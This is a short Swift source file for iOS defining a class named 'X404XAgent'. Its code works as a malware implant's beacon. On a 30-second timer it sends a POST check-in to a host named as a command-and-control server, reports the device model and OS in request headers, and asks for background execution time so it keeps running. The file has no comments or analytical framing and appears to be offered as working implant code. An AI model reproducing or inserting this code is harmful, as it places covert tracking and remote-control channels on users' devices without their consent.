import Foundation; import UIKit
class X404XAgent: NSObject {
    private var timer: Timer?; private var backgroundTask: UIBackgroundTaskIdentifier = .invalid
    func start() {
        timer = Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { [weak self] _ in
            self?.checkIn()
        }
        NotificationCenter.default.addObserver(self, selector: #selector(appDidEnterBackground), name: UIApplication.didEnterBackgroundNotification, object: nil)
    }
    @objc private func appDidEnterBackground() {
        backgroundTask = UIApplication.shared.beginBackgroundTask { UIApplication.shared.endBackgroundTask(self.backgroundTask) }
    }
    private func checkIn() {
        guard let url = URL(string: "https://x404x-c2.online:8443/checkin") else { return }
        var req = URLRequest(url: url); req.httpMethod = "POST"
        req.setValue(UIDevice.current.model, forHTTPHeaderField: "X-Agent-ID")
        req.setValue("ios", forHTTPHeaderField: "X-Agent-OS")
        URLSession.shared.dataTask(with: req) { _, _, _ in }.resume()
    }
}
